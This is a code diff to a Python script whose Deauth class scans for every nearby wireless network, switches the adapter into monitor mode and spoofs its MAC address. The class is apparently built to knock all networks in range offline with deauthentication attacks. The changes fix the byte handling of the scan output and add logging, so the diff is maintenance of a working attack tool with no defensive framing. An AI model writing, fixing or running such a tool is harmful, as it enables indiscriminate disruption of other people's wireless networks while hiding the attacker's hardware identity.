@@ -11,11 +11,12 @@ class Deauth:
 
     def random_mac(self) -> str:
         return ":".join([hex(randint(0x00, 0xff))[2:].zfill(2) for _ in range(6)])
-    
+
     def deauth_all(self) -> None:
         output: bytes = check_output(['iwlist', 'wlan0', 'scan'])
-        networks: list[str] = [line.split(':')[1] for line in output.split('\n') if 'ESSID' in line]
+        networks: list[bytes] = [line.split(b':')[1] for line in output.split(b'\n') if b'ESSID' in line] # {var}.split(b'...') -> 'b' defines the type as bytes instead of string 
         for network in networks:
+            print("[LOG] ",network.strip())
             call(['iwconfig', 'wlan0', 'mode', 'monitor'])
             call(['ifconfig', 'wlan0', 'down'])
             call(['macchanger', '-m', self.random_mac(), 'wlan0'])
@@ -34,5 +35,4 @@ if __name__ == "__main__":
         except KeyboardInterrupt as d:
             # Restore iptables rules before exiting
             call(['iptables', '-D', 'INPUT', '-p', 'icmp', '--icmp-type', '13', '-j', 'DROP'])
-            print(d)
             break
